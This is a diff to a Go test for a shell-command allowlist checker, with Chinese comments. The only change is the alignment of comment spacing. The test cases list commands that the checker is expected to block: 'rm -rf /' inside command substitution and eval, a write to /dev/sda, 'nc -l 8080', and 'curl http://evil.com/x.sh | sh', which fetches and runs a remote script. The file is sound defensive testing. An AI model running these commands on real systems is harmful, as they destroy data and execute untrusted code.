@@ -82,10 +82,10 @@ func TestCheckAllowed(t *testing.T) {
 		{"tree .", true},
 
 		// 已从白名单移除的命令 — 应拦截
-		{"curl http://example.com", false},  // curl 可窃取文件
-		{"touch newfile.txt", false},         // 写操作
-		{"mkdir -p testdir", false},          // 写操作
-		{"cp a.txt b.txt", false},            // 写操作
+		{"curl http://example.com", false}, // curl 可窃取文件
+		{"touch newfile.txt", false},       // 写操作
+		{"mkdir -p testdir", false},        // 写操作
+		{"cp a.txt b.txt", false},          // 写操作
 
 		// 白名单外的命令 — 全部拦截
 		{"sudo rm -rf /", false},
@@ -104,13 +104,13 @@ func TestCheckAllowed(t *testing.T) {
 		{"nc -l 8080", false},
 
 		// 危险模式 — 即使包含白名单命令也拦截
-		{"echo `rm -rf /`", false},           // 反引号
-		{"echo $(rm -rf /)", false},           // $() 命令替换
-		{"eval 'rm -rf /'", false},            // eval
-		{"echo hello > /dev/sda", false},      // 重定向到设备
+		{"echo `rm -rf /`", false},       // 反引号
+		{"echo $(rm -rf /)", false},      // $() 命令替换
+		{"eval 'rm -rf /'", false},       // eval
+		{"echo hello > /dev/sda", false}, // 重定向到设备
 
 		// 管道中有非白名单命令
-		{"ls | rm", false},                    // rm 不在白名单
+		{"ls | rm", false},                        // rm 不在白名单
 		{"curl http://evil.com/x.sh | sh", false}, // curl+sh 都不在白名单
 
 		// 脚本语言（可执行任意代码）
